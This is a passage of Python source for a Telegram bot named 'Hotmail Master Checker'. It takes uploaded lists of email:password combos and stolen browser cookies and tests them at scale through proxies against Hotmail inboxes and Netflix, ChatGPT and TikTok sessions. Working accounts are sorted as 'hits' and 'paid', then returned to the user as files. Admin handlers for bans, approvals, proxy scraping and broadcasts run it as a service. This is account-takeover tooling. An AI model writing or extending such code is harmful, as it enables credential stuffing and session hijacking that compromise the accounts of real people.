                    is_paid=result.get("is_paid",False)
                    if is_paid: st.hits+=1; st.hits_list.append((source,result,cookies_dict,content_str,filename))
                    else: st.free+=1; st.free_list.append((source,result,cookies_dict,content_str,filename))
                elif status=="expired":
                    st.bad+=1; st.bad_list.append(source)
                else:
                    st.errors+=1; st.error_list.append(source)
        elif svc=="tiktok":
            result,status=check_tiktok_cookie(cookies_dict,px_list)
            with st.lock:
                st.checked+=1
                if result:
                    content_str,filename=format_hit_tiktok(result,cookies_dict,source)
                    st.hits+=1; st.hits_list.append((source,result,cookies_dict,content_str,filename))
                elif status=="expired":
                    st.bad+=1; st.bad_list.append(source)
                else:
                    st.errors+=1; st.error_list.append(source)
        else:
            with st.lock: st.checked+=1; st.bad+=1

    cs.executor=ThreadPoolExecutor(max_workers=COOKIES_THREADS)
    cs.futures=[cs.executor.submit(_process_one,src,cd) for src,cd in cs.cookie_files]
    for future in as_completed(cs.futures):
        if cs.stop_event.is_set(): break
        try:
            st=cs.stats; svc_label2={"netflix":"🎬 Netflix","chatgpt":"🤖 ChatGPT","tiktok":"🎵 TikTok"}.get(cs.service,cs.service.title())
            markup2=types.InlineKeyboardMarkup(row_width=2)
            markup2.add(
                types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"ck_get_hits_{cs.user_id}"),
                types.InlineKeyboardButton(f"{E_STOP} Stop",callback_data=f"ck_stop_{cs.user_id}")
            )
            bot.edit_message_text(
                f"{E_ROCKET} {bold(f'Cookie Checker — {svc_label2}')}\n{mono(f'{st.checked}/{st.total}')} | {E_FIRE} Hits: {mono(str(st.hits))} | {E_RED} Bad: {mono(str(st.bad))}",
                chat_id=chat_id,message_id=cs.msg_id,parse_mode="HTML",reply_markup=markup2,disable_web_page_preview=True)
        except: pass
    cs.finished=True; cs.executor.shutdown(wait=False)
    try:
        st=cs.stats; svc_label3={"netflix":"🎬 Netflix","chatgpt":"🤖 ChatGPT","tiktok":"🎵 TikTok"}.get(cs.service,cs.service.title())
        markup_final=types.InlineKeyboardMarkup(row_width=2)
        markup_final.add(
            types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"ck_get_hits_{cs.user_id}"),
            types.InlineKeyboardButton(f"{E_STOP} Done",callback_data=f"ck_done_{cs.user_id}")
        )
        bot.edit_message_text(
            f"{E_PARTY} {bold(f'Cookie Checker Complete — {svc_label3}')}\n{E_CHECK} Hits: {mono(str(st.hits))} | {E_RED} Bad: {mono(str(st.bad))} | {E_CROSS} Errors: {mono(str(st.errors))}",
            chat_id=chat_id,message_id=cs.msg_id,parse_mode="HTML",reply_markup=markup_final,disable_web_page_preview=True)
    except: pass
    # Send hits as files
    try:
        st=cs.stats
        for source,result,cookies_dict,content_str,filename in st.hits_list[:20]:
            try:
                f=io.BytesIO(content_str.encode("utf-8")); f.name=filename
                bot.send_document(chat_id,f,caption=f"{E_FIRE} Cookie Hit: {source[:50]}")
            except: pass
    except: pass

# ══════════════════════════════════════════════════════════
#  BOT COMMANDS & HANDLERS
# ══════════════════════════════════════════════════════════

def _answer(call_id,text=None,alert=False):
    try: bot.answer_callback_query(call_id,text=text,show_alert=alert)
    except: pass

@bot.message_handler(commands=["start"])
def cmd_start(message):
    user=message.from_user; db_inst=load_db(); update_user_info(db_inst,user)
    banned,reason=is_banned(db_inst,user.id)
    if banned:
        bot.reply_to(message,f"{E_BAN} {bold('You are banned!')}\n{E_MEMO} Reason: {mono(reason or 'No reason')}",parse_mode="HTML"); return
    uptime=time.time()-BOT_START_TIME; uptime_str=time.strftime("%H:%M:%S",time.gmtime(uptime))
    total_users=len(db_inst.get("users",{})); total_proxies=len(init_proxies())
    g=db_inst.get("global_stats",{})
    welcome=f"""{E_WAVE} {bold('Welcome to Hotmail Master Checker!')}

{E_SPARKLE} Hello, {user.first_name or 'User'}!
{E_ROBOT} {italic('Your all-in-one account checker')}

{E_SHIELD} {bold('Bot Health:')}
{E_GREEN} Status: {mono('Online')}
{E_CLOCK} Uptime: {mono(uptime_str)}
{E_USER} Users: {mono(str(total_users))}
{E_GLOBE} Proxies: {mono(str(total_proxies))}

{E_CHART} {bold('Global Stats:')}
{E_CHECK} Checked: {mono(str(g.get('total_checked',0)))}
{E_FIRE} Hits: {mono(str(g.get('total_hits',0)))}

{E_GEAR} {italic(DEV_TAG)}"""
    bot.reply_to(message,welcome,parse_mode="HTML",disable_web_page_preview=True)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user=message.from_user; db_inst=load_db(); update_user_info(db_inst,user)
    banned,reason=is_banned(db_inst,user.id)
    if banned:
        bot.reply_to(message,f"{E_BAN} {bold('You are banned!')}\n{E_MEMO} Reason: {mono(reason)}",parse_mode="HTML"); return
    doc=message.document; fname=doc.file_name or ""
    is_txt=fname.lower().endswith(".txt"); is_zip=fname.lower().endswith(".zip")
    if not is_txt and not is_zip:
        bot.reply_to(message,f"{E_CROSS} {bold('Only .txt or .zip files are supported!')}",parse_mode="HTML"); return
    try:
        file_info=bot.get_file(doc.file_id); downloaded=bot.download_file(file_info.file_path)
        if len(downloaded)>MAX_FILE_SIZE:
            bot.reply_to(message,f"{E_CROSS} {bold('File too large!')}\n{E_MEMO} Max: {MAX_FILE_SIZE_MB}MB",parse_mode="HTML"); return
        content=downloaded
        if is_zip:
            with zipfile.ZipFile(io.BytesIO(content)) as zf:
                txt_files=[n for n in zf.namelist() if n.lower().endswith(".txt") and "__MACOSX" not in n]
                if not txt_files:
                    bot.reply_to(message,f"{E_CROSS} {bold('No .txt files found in zip!')}",parse_mode="HTML"); return
                all_content=b""
                for tf in txt_files: all_content+=zf.read(tf)+b"\n"
                content=all_content
        with active_checks_lock:
            active_checks[f"file_{user.id}"]={"filename":fname,"content":content,"raw_bytes":downloaded,"size":len(content),"is_zip":is_zip}
        markup=types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"📧 M-HOTMAIL",callback_data=f"mode_hotmail_{user.id}"),
            types.InlineKeyboardButton(f"📬 Inboxer",callback_data=f"mode_inboxer_{user.id}"),
        )
        markup.add(
            types.InlineKeyboardButton(f"🍪 Cookies",callback_data=f"mode_cookies_{user.id}"),
            types.InlineKeyboardButton(f"◀️ Exit",callback_data=f"mode_exit_{user.id}"),
        )
        bot.reply_to(message,f"{E_FILE} {bold('File received!')}\n{mono(fname)} ({len(content)//1024}KB)\n\n{bold('Choose check mode:')}",parse_mode="HTML",reply_markup=markup)
    except Exception as e:
        bot.reply_to(message,f"{E_CROSS} Error: {mono(str(e))}",parse_mode="HTML")

@bot.callback_query_handler(func=lambda call:call.data.startswith("mode_hotmail_"))
def cb_mode_hotmail(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock:
        fd=active_checks.get(f"file_{uid}")
        if not fd: _answer(call.id,"Session expired. Send file again.",alert=True); return
    try: bot.edit_message_text(f"{E_HOURGLASS} {bold('Parsing combos...')} {E_GEAR}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
    except: pass
    def do_parse():
        try:
            db_inst=load_db(); is_admin=call.from_user.id==ADMIN_ID
            lines=fd["content"].decode("utf-8",errors="ignore").splitlines()
            combos,total_lines,bad_lines=parse_combos(lines)
            valid=len(combos); approved=is_approved(db_inst,uid) or is_admin
            over_limit=not approved and total_lines>MAX_LINES; sep="━"*20
            summary=(f"📧 {bold('M-Hotmail — File Summary')}\n{sep}\n"
                f"{E_MEMO} File: {mono(fd['filename'])}\n"
                f"{E_CHART} Total Lines: {mono(str(total_lines))}\n"
                f"{E_CHECK} Valid Combos: {mono(str(valid))}\n"
                f"{E_CROSS} Invalid/Skipped: {mono(str(bad_lines))}\n"
                f"{E_BOLT} Threads: {mono(str(MASTER_THREADS))}\n{sep}")
            if over_limit:
                summary+=(f"\n{E_WARN} {bold(f'More than {MAX_LINES} lines!')}\n{E_CROWN} Contact admin for approval.\n{E_GEAR} {DEV_TAG}")
                try: bot.edit_message_text(summary,chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
                except: pass; return
            if valid==0:
                summary+=(f"\n{E_CROSS} {bold('No valid combos found!')}\n{E_GEAR} {DEV_TAG}")
                try: bot.edit_message_text(summary,chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
                except: pass; return
            summary+=(f"\n{E_GREEN} {bold('Ready to check!')}\n{E_GEAR} {DEV_TAG}")
            try:
                markup=types.InlineKeyboardMarkup(row_width=2)
                markup.add(
                    types.InlineKeyboardButton(f"{E_PLAY} Start",callback_data=f"start_check_{uid}"),
                    types.InlineKeyboardButton(f"{E_STOP} Cancel",callback_data=f"cancel_check_{uid}"),
                )
                bot.edit_message_text(summary,chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML",reply_markup=markup)
            except: pass
            with active_checks_lock:
                active_checks[f"pending_check_{uid}"]={"combos":combos,"filename":fd["filename"],"total":total_lines,"bad":bad_lines}
        except Exception as e:
            try: bot.edit_message_text(f"{E_CROSS} Parse error: {mono(str(e))}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
            except: pass
    threading.Thread(target=do_parse,daemon=True).start()

@bot.callback_query_handler(func=lambda call:call.data.startswith("mode_inboxer_"))
def cb_mode_inboxer(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock:
        fd=active_checks.get(f"file_{uid}")
        if not fd: return
    try: bot.edit_message_text(f"{E_HOURGLASS} {bold('Parsing combos...')} {E_GEAR}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
    except: pass
    def do_parse():
        try:
            db_inst=load_db(); is_admin=call.from_user.id==ADMIN_ID
            lines=fd["content"].decode("utf-8",errors="ignore").splitlines()
            combos,total_lines,bad_lines=parse_inbox_combos(lines)
            valid=len(combos); approved=is_approved(db_inst,uid) or is_admin
            over_limit=not approved and total_lines>MAX_LINES; sep="━"*20
            summary=(f"📬 {bold('Inboxer — File Summary')}\n{sep}\n"
                f"{E_MEMO} File: {mono(fd['filename'])}\n"
                f"{E_CHART} Total Lines: {mono(str(total_lines))}\n"
                f"{E_CHECK} Valid Combos: {mono(str(valid))}\n"
                f"{E_CROSS} Invalid/Skipped: {mono(str(bad_lines))}\n"
                f"{E_BOLT} Threads: {mono(str(INBOXER_THREADS))}\n{sep}")
            if over_limit:
                summary+=(f"\n{E_WARN} {bold(f'More than {MAX_LINES} lines!')}\n{E_CROWN} Contact admin.\n{E_GEAR} {DEV_TAG}")
                bot.edit_message_text(summary,chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML"); return
            if valid==0:
                summary+=(f"\n{E_CROSS} {bold('No valid combos!')}\n{E_GEAR} {DEV_TAG}")
                bot.edit_message_text(summary,chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML"); return
            summary+=(f"\n{E_GREEN} {bold('Ready!')}\n{E_GEAR} {DEV_TAG}")
            markup=types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton(f"{E_PLAY} Start",callback_data=f"ib_start_{uid}"),
                types.InlineKeyboardButton(f"{E_STOP} Cancel",callback_data=f"ib_cancel_{uid}"),
            )
            bot.edit_message_text(summary,chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML",reply_markup=markup)
            with active_checks_lock:
                active_checks[f"pending_ib_{uid}"]={"combos":combos}
        except Exception as e:
            bot.edit_message_text(f"{E_CROSS} Parse error: {mono(str(e))}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
    threading.Thread(target=do_parse,daemon=True).start()

@bot.callback_query_handler(func=lambda call:call.data.startswith("mode_cookies_"))
def cb_mode_cookies(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock:
        fd=active_checks.get(f"file_{uid}")
        if not fd: return
    try: bot.edit_message_text(f"{E_HOURGLASS} {bold('Parsing cookies...')} {E_GEAR}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
    except: pass
    def do_parse():
        try:
            # Use raw_bytes so zip files are handled properly by extract_cookie_files
            raw_bytes=fd.get("raw_bytes",fd["content"])
            fname=fd["filename"]
            files=extract_cookie_files(raw_bytes,fname)  # [(source_name, text)]
            total=len(files)
            summary=(f"🍪 {bold('Cookie Checker — File Summary')}\n"
                f"{E_MEMO} File: {mono(fname)}\n"
                f"{E_CHART} Cookie sets found: {mono(str(total))}\n"
                f"{E_GREEN} Ready!\n{E_GEAR} {DEV_TAG}")
            markup=types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🎬 Netflix",callback_data=f"ck_svc_netflix_{uid}"),
                types.InlineKeyboardButton("🤖 ChatGPT",callback_data=f"ck_svc_chatgpt_{uid}"),
            )
            markup.add(
                types.InlineKeyboardButton("🎵 TikTok",callback_data=f"ck_svc_tiktok_{uid}"),
                types.InlineKeyboardButton("◀️ Back",callback_data=f"mode_back_{uid}"),
            )
            bot.edit_message_text(summary,chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML",reply_markup=markup)
            with active_checks_lock:
                active_checks[f"pending_ck_{uid}"]={"files":files}
        except Exception as e:
            bot.edit_message_text(f"{E_CROSS} Parse error: {mono(str(e))}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
    threading.Thread(target=do_parse,daemon=True).start()

@bot.callback_query_handler(func=lambda call:call.data.startswith("ck_svc_"))
def cb_ck_svc(call):
    parts=call.data.split("_"); svc=parts[2]; uid=int(parts[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock:
        fd=active_checks.get(f"pending_ck_{uid}")
        if not fd: return
        files=fd.get("files",[])  # [(source_name, text)]
    # Filter valid cookies for the selected service
    if svc=="netflix":
        cnt,valid_pairs=count_valid_netflix(files)
    elif svc=="chatgpt":
        cnt,valid_pairs=count_valid_chatgpt(files)
    elif svc=="tiktok":
        cnt,valid_pairs=count_valid_tiktok(files)
    else:
        cnt,valid_pairs=0,[]
    if not valid_pairs:
        bot.send_message(call.message.chat.id,f"{E_CROSS} No valid {svc} cookies found!",parse_mode="HTML"); return
    cs=CookieCheckerSession(uid,svc,valid_pairs)  # valid_pairs=[(source,cookies_dict)]
    with active_checks_lock: active_checks[uid]=cs
    threading.Thread(target=run_cookie_checker,args=(cs,call.message,call.from_user),daemon=True).start()

@bot.callback_query_handler(func=lambda call:call.data.startswith("mode_back_"))
def cb_mode_back(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    with active_checks_lock: fd=active_checks.get(f"file_{uid}")
    if not fd:
        _answer(call.id,"Session expired.",alert=True)
        try: bot.delete_message(call.message.chat.id,call.message.message_id)
        except: pass; return
    fname=fd["filename"]; fsize=fd["size"]
    markup=types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"📧 M-HOTMAIL",callback_data=f"mode_hotmail_{uid}"),
        types.InlineKeyboardButton(f"📬 Inboxer",callback_data=f"mode_inboxer_{uid}"),
    )
    markup.add(
        types.InlineKeyboardButton(f"🍪 Cookies",callback_data=f"mode_cookies_{uid}"),
        types.InlineKeyboardButton(f"◀️ Exit",callback_data=f"mode_exit_{uid}"),
    )
    try: bot.edit_message_text(f"{E_FILE} {bold('File received!')}\n{mono(fname)} ({fsize//1024}KB)\n\n{bold('Choose check mode:')}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML",reply_markup=markup)
    except: pass
    _answer(call.id)

@bot.callback_query_handler(func=lambda call:call.data.startswith("mode_exit_"))
def cb_mode_exit(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    try: bot.delete_message(call.message.chat.id,call.message.message_id)
    except: pass
    bot.send_message(call.message.chat.id,"👋 Good Bye :)")
    with active_checks_lock: active_checks.pop(f"file_{uid}",None)
    _answer(call.id)

@bot.callback_query_handler(func=lambda call:call.data.startswith("start_check_"))
def cb_start_check(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock: pending=active_checks.get(f"pending_check_{uid}")
    if not pending: _answer(call.id,"Session expired.",alert=True); return
    combos=pending.get("combos",[])
    if not combos: _answer(call.id,"No combos to check.",alert=True); return
    cs=CheckerSession(uid,combos)
    with active_checks_lock:
        active_checks[uid]=cs
        active_checks.pop(f"pending_check_{uid}",None)
    threading.Thread(target=run_checker,args=(cs,call.message,call.from_user),daemon=True).start()

@bot.callback_query_handler(func=lambda call:call.data.startswith("ib_start_"))
def cb_ib_start(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock: pending=active_checks.get(f"pending_ib_{uid}")
    if not pending: _answer(call.id,"Session expired.",alert=True); return
    combos=pending.get("combos",[])
    cs=InboxCheckerSession(uid,combos)
    with active_checks_lock:
        active_checks[uid]=cs
        active_checks.pop(f"pending_ib_{uid}",None)
    threading.Thread(target=run_inbox_checker,args=(cs,call.message,call.from_user),daemon=True).start()

@bot.callback_query_handler(func=lambda call:call.data.startswith("cancel_check_") or call.data.startswith("ib_cancel_"))
def cb_cancel(call):
    uid=int(call.data.split("_")[-1]); _answer(call.id)
    try: bot.edit_message_text(f"{E_STOP} {bold('Cancelled.')}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
    except: pass
    with active_checks_lock:
        active_checks.pop(f"pending_check_{uid}",None)
        active_checks.pop(f"pending_ib_{uid}",None)
        active_checks.pop(f"pending_ck_{uid}",None)

@bot.callback_query_handler(func=lambda call:call.data.startswith("stop_check_"))
def cb_stop_check(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid and call.from_user.id!=ADMIN_ID: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id,"Stopping...")
    with active_checks_lock: cs=active_checks.get(uid)
    if cs and hasattr(cs,"stop_event"):
        cs.stop_event.set()
        try: bot.edit_message_text(f"{E_STOP} {bold('Stopping...')}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
        except: pass

@bot.callback_query_handler(func=lambda call:call.data.startswith("ib_stop_"))
def cb_ib_stop(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid and call.from_user.id!=ADMIN_ID: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id,"Stopping...")
    with active_checks_lock: cs=active_checks.get(uid)
    if cs and hasattr(cs,"stop_event"):
        cs.stop_event.set()
        try: bot.edit_message_text(f"{E_STOP} {bold('Stopping...')}",chat_id=call.message.chat.id,message_id=call.message.message_id,parse_mode="HTML")
        except: pass

@bot.callback_query_handler(func=lambda call:call.data.startswith("ck_stop_"))
def cb_ck_stop(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid and call.from_user.id!=ADMIN_ID: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id,"Stopping...")
    with active_checks_lock: cs=active_checks.get(uid)
    if cs and hasattr(cs,"stop_event"): cs.stop_event.set()

@bot.callback_query_handler(func=lambda call:call.data.startswith("get_hits_"))
def cb_get_hits(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid and call.from_user.id!=ADMIN_ID: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock: cs=active_checks.get(uid)
    if not cs or not isinstance(cs,CheckerSession): _answer(call.id,"No active check.",alert=True); return
    try:
        hits_text=build_hits_text(cs)
        if len(hits_text)>4000:
            f=io.BytesIO(hits_text.encode("utf-8")); f.name=f"hits_{uid}.txt"
            bot.send_document(call.message.chat.id,f,caption=f"{E_FIRE} Current hits")
        else:
            bot.send_message(call.message.chat.id,f"{E_FIRE} {bold('Current Hits:')}\n<pre>{hits_text}</pre>",parse_mode="HTML")
    except Exception as e:
        bot.send_message(call.message.chat.id,f"{E_CROSS} Error: {mono(str(e))}",parse_mode="HTML")

@bot.callback_query_handler(func=lambda call:call.data.startswith("ib_get_hits_"))
def cb_ib_get_hits(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid and call.from_user.id!=ADMIN_ID: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock: cs=active_checks.get(uid)
    if not cs or not isinstance(cs,InboxCheckerSession): _answer(call.id,"No active check.",alert=True); return
    try:
        hits="\n".join([f"{r.get('email','')}:{r.get('password','')} | {r.get('services',[])}" for r in cs.stats.hits_list])
        if not hits: hits="No hits yet."
        if len(hits)>4000:
            f=io.BytesIO(hits.encode("utf-8")); f.name=f"inbox_hits_{uid}.txt"
            bot.send_document(call.message.chat.id,f,caption=f"{E_FIRE} Inbox hits")
        else:
            bot.send_message(call.message.chat.id,f"{E_FIRE} {bold('Inbox Hits:')}\n<pre>{hits}</pre>",parse_mode="HTML")
    except Exception as e:
        bot.send_message(call.message.chat.id,f"{E_CROSS} Error: {mono(str(e))}",parse_mode="HTML")

@bot.callback_query_handler(func=lambda call:call.data.startswith("ck_get_hits_"))
def cb_ck_get_hits(call):
    uid=int(call.data.split("_")[-1])
    if call.from_user.id!=uid and call.from_user.id!=ADMIN_ID: _answer(call.id,"Not your session!",alert=True); return
    _answer(call.id)
    with active_checks_lock: cs=active_checks.get(uid)
    if not cs or not isinstance(cs,CookieCheckerSession): _answer(call.id,"No active check.",alert=True); return
    try:
        lines=[]
        for item in cs.stats.hits_list:
            src,res=item[0],item[1]
            if isinstance(res,dict):
                detail=res.get('token') or res.get('email') or res.get('username') or str(res)[:80]
                lines.append(f"{src} | {detail}")
            else: lines.append(str(src))
        hits="\n".join(lines) if lines else "No hits yet."
        if len(hits)>4000:
            f=io.BytesIO(hits.encode("utf-8")); f.name=f"cookie_hits_{uid}.txt"
            bot.send_document(call.message.chat.id,f,caption=f"{E_FIRE} Cookie hits")
        else:
            bot.send_message(call.message.chat.id,f"{E_FIRE} {bold('Cookie Hits:')}\n<pre>{hits}</pre>",parse_mode="HTML")
    except Exception as e:
        bot.send_message(call.message.chat.id,f"{E_CROSS} Error: {mono(str(e))}",parse_mode="HTML")

# ══════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════

@bot.message_handler(commands=["adm"])
def cmd_adm(message):
    if message.from_user.id!=ADMIN_ID: return
    cmds="\n".join([
        f"{E_BAN} <code>/ban &lt;id&gt; &lt;reason&gt; [days]</code>",
        f"{E_UNLOCK} <code>/unban &lt;id&gt; [reason]</code>",
        f"{E_CHECK} <code>/approve &lt;id&gt; [days]</code>",
        f"{E_CROSS} <code>/demote &lt;id&gt;</code>",
        f"{E_BELL} <code>/broadcast</code> — Reply to broadcast",
        f"{E_CHART} <code>/status</code> — Full stats",
        f"{E_GLOBE} <code>/get_proxies</code> — Get proxy list",
        f"{E_BOLT} <code>/addproxy &lt;proxy&gt;</code> — Add proxy",
        f"{E_GEAR} <code>/updatep</code> — Reply to proxy file",
        f"{E_SHIELD} <code>/test</code> — Test all proxies",
        f"{E_ROCKET} <code>/scrap</code> — Fetch Urban VPN proxies",
        f"{E_FILE} <code>/fetch</code> — DB backup",
        f"📦 <code>/fetch_full</code> — Full bot source + DB zip",
        "🧹 <code>/clear_cache</code> — Clear bot cache",
        "👥 <code>/users</code> — List users",
        "🔍 <code>/userinfo &lt;id&gt;</code> — User details",
        "🗑️ <code>/deleteuser &lt;id&gt;</code> — Remove from DB",
        "🌐 <code>/myip</code> — Bot's current IP",
        "🧵 <code>/threads</code> — Thread config",
        "📊 <code>/globalstats</code> — Global stats",
        "🔄 <code>/restart_proxy</code> — Force proxy refresh",
        "♻️ <code>/refresh</code> — Refresh bot",
        "📜 <code>/logs [mins]</code> — Get last N mins of logs",
        "📡 <code>/pool_status</code> — Proxy fetch info",
    ])
    text=f"{E_CROWN} {bold('Admin Panel')}\n{_bq(cmds)}\n{E_GEAR} {italic(DEV_TAG)}"
    bot.reply_to(message,text,parse_mode="HTML")

@bot.message_handler(commands=["ban"])
def cmd_ban(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split(maxsplit=3)
    if len(parts)<3: bot.reply_to(message,f"{E_WARN} Usage: <code>/ban &lt;id&gt; &lt;reason&gt; [days]</code>",parse_mode="HTML"); return
    try: target_id=int(parts[1])
    except: bot.reply_to(message,f"{E_CROSS} Invalid user ID!",parse_mode="HTML"); return
    reason=parts[2] if len(parts)>2 else "No reason"; days=None
    if len(parts)>3:
        try: days=int(parts[3])
        except: pass
    db_inst=load_db()
    db_inst.setdefault("banned",{})[str(target_id)]={"reason":reason,"days":days,"date":datetime.now().isoformat(),"by":ADMIN_ID}
    save_db(db_inst); duration=f"{days} days" if days else "Lifetime"
    info=f"{E_USER} ID: {mono(str(target_id))}\n{E_MEMO} Reason: {mono(reason)}\n{E_CLOCK} Duration: {mono(duration)}"
    bot.reply_to(message,f"{E_BAN} {bold('User Banned!')}\n{_bq(info)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    try: bot.send_message(target_id,f"{E_BAN} {bold('You have been banned!')}\n{_bq(f'{E_MEMO} Reason: {mono(reason)}')}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    except: pass

@bot.message_handler(commands=["unban"])
def cmd_unban(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split(maxsplit=2)
    if len(parts)<2: bot.reply_to(message,f"{E_WARN} Usage: <code>/unban &lt;id&gt; [reason]</code>",parse_mode="HTML"); return
    try: target_id=int(parts[1])
    except: bot.reply_to(message,f"{E_CROSS} Invalid user ID!",parse_mode="HTML"); return
    reason=parts[2] if len(parts)>2 else "No reason"; db_inst=load_db()
    if str(target_id) in db_inst.get("banned",{}):
        del db_inst["banned"][str(target_id)]; save_db(db_inst)
    info=f"{E_USER} ID: {mono(str(target_id))}\n{E_MEMO} Reason: {mono(reason)}"
    bot.reply_to(message,f"{E_UNLOCK} {bold('User Unbanned!')}\n{_bq(info)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    try: bot.send_message(target_id,f"{E_UNLOCK} {bold('You have been unbanned!')}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    except: pass

@bot.message_handler(commands=["approve"])
def cmd_approve(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split()
    if len(parts)<2: bot.reply_to(message,f"{E_WARN} Usage: <code>/approve &lt;id&gt; [days]</code>",parse_mode="HTML"); return
    try: target_id=int(parts[1])
    except: bot.reply_to(message,f"{E_CROSS} Invalid user ID!",parse_mode="HTML"); return
    days=None
    if len(parts)>2:
        try: days=int(parts[2])
        except: pass
    db_inst=load_db()
    db_inst.setdefault("approved",{})[str(target_id)]={"days":days,"date":datetime.now().isoformat(),"by":ADMIN_ID}
    save_db(db_inst); duration=f"{days} days" if days else "Lifetime"
    info=f"{E_USER} ID: {mono(str(target_id))}\n{E_CLOCK} Duration: {mono(duration)}"
    bot.reply_to(message,f"{E_CROWN} {bold('User Approved!')}\n{_bq(info)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    try: bot.send_message(target_id,f"{E_CROWN} {bold('You have been approved!')}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    except: pass

@bot.message_handler(commands=["demote"])
def cmd_demote(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split()
    if len(parts)<2: bot.reply_to(message,f"{E_WARN} Usage: <code>/demote &lt;id&gt;</code>",parse_mode="HTML"); return
    try: target_id=int(parts[1])
    except: bot.reply_to(message,f"{E_CROSS} Invalid user ID!",parse_mode="HTML"); return
    db_inst=load_db()
    if str(target_id) in db_inst.get("approved",{}): del db_inst["approved"][str(target_id)]; save_db(db_inst)
    bot.reply_to(message,f"{E_CROSS} {bold('User Demoted!')}\n{_bq(f'{E_USER} ID: {mono(str(target_id))}')}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    try: bot.send_message(target_id,f"{E_CROSS} {bold('You have been demoted.')}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    except: pass

@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    if message.from_user.id!=ADMIN_ID: return
    if not message.reply_to_message:
        bot.reply_to(message,f"{E_WARN} Reply to a message to broadcast it!",parse_mode="HTML"); return
    db_inst=load_db(); users=list(db_inst.get("users",{}).keys())
    total=len(users); sent=0; failed=0
    progress_msg=bot.reply_to(message,f"{E_BELL} Broadcasting... 0/{total}",parse_mode="HTML")
    for uid in users:
        try: bot.copy_message(int(uid),message.chat.id,message.reply_to_message.message_id); sent+=1
        except: failed+=1
        if (sent+failed)%10==0:
            try:
                pbar=make_progress_bar(sent+failed,total,15)
                body=f"{mono(pbar)}\n{E_CHECK} Sent: {sent}  {E_CROSS} Failed: {failed}"
                bot.edit_message_text(f"{E_BELL} {bold('Broadcasting...')}\n{_bq(body)}",progress_msg.chat.id,progress_msg.message_id,parse_mode="HTML")
            except: pass
    body=f"{E_CHECK} Sent: {mono(str(sent))}\n{E_CROSS} Failed: {mono(str(failed))}\n{E_CHART} Total: {mono(str(total))}"
    bot.edit_message_text(f"{E_BELL} {bold('Broadcast Complete!')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",progress_msg.chat.id,progress_msg.message_id,parse_mode="HTML")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    if message.from_user.id!=ADMIN_ID: return
